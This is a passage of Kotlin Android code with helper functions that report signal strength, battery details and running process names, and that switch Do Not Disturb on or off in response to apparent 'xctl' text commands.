            val signal = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                try {
                    val ssm = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
                    val cdma = ssm.signalStrength?.let { ss ->
                        (ss.javaClass.getMethod("getLevel").invoke(ss) as? Int)?.toString()
                    }
                    cdma ?: "N/A"
                } catch (e: Exception) { "N/A" }
            } else "N/A"
            "Network:$operator($country)|Signal:$signal"
        } catch (e: SecurityException) { "Error: Missing READ_PHONE_STATE permission" }
        catch (e: Exception) { "Error: ${e.message}" }
    }

    fun getBatteryDetail(): String {
        return try {
            val intent = context.registerReceiver(null,
                IntentFilter(Intent.ACTION_BATTERY_CHANGED))
            val level = intent?.getIntExtra(BatteryManager.EXTRA_LEVEL, 0) ?: 0
            val scale = intent?.getIntExtra(BatteryManager.EXTRA_SCALE, 100) ?: 100
            val pct = (level * 100) / scale
            val status = intent?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
            val plugged = intent?.getIntExtra(BatteryManager.EXTRA_PLUGGED, 0) ?: 0
            val temp = (intent?.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0) ?: 0) / 10.0
            val voltage = intent?.getIntExtra(BatteryManager.EXTRA_VOLTAGE, 0) ?: 0
            val health = intent?.getIntExtra(BatteryManager.EXTRA_HEALTH, 0) ?: 0

            val statusStr = when (status) {
                BatteryManager.BATTERY_STATUS_CHARGING -> "Charging"
                BatteryManager.BATTERY_STATUS_DISCHARGING -> "Discharging"
                BatteryManager.BATTERY_STATUS_FULL -> "Full"
                BatteryManager.BATTERY_STATUS_NOT_CHARGING -> "Not charging"
                else -> "Unknown"
            }
            val plugStr = when {
                plugged and BatteryManager.BATTERY_PLUGGED_AC != 0 -> "AC"
                plugged and BatteryManager.BATTERY_PLUGGED_USB != 0 -> "USB"
                plugged and BatteryManager.BATTERY_PLUGGED_WIRELESS != 0 -> "Wireless"
                else -> "Battery"
            }
            val healthStr = when (health) {
                BatteryManager.BATTERY_HEALTH_GOOD -> "Good"
                BatteryManager.BATTERY_HEALTH_OVERHEAT -> "Overheat"
                BatteryManager.BATTERY_HEALTH_DEAD -> "Dead"
                BatteryManager.BATTERY_HEALTH_OVER_VOLTAGE -> "OverVoltage"
                BatteryManager.BATTERY_HEALTH_UNSPECIFIED_FAILURE -> "Failure"
                else -> "OK"
            }
            "Bat:$pct%|$statusStr($plugStr)|${temp}C|${voltage}mv|$healthStr"
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    fun setDnd(mode: String): String {
        return try {
            val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                when (mode.lowercase()) {
                    "on" -> {
                        nm.setInterruptionFilter(
                            NotificationManager.INTERRUPTION_FILTER_NONE)
                        "Do Not Disturb on"
                    }
                    "off" -> {
                        nm.setInterruptionFilter(
                            NotificationManager.INTERRUPTION_FILTER_ALL)
                        "Do Not Disturb off"
                    }
                    else -> "Usage: xctl DND [on/off]"
                }
            } else {
                "DND not supported on this device"
            }
        } catch (e: SecurityException) {
            "DND requires NOTIFICATION_POLICY_ACCESS permission"
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    fun getRunningProcesses(): String {
        return try {
            val am = context.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
            val processes = am.runningAppProcesses
            if (processes != null) {
                processes.take(30).joinToString(", ") { it.processName }
            } else "Cannot access running processes"
        } catch (e: Exception) { "Error: ${e.message}" }
    }
}
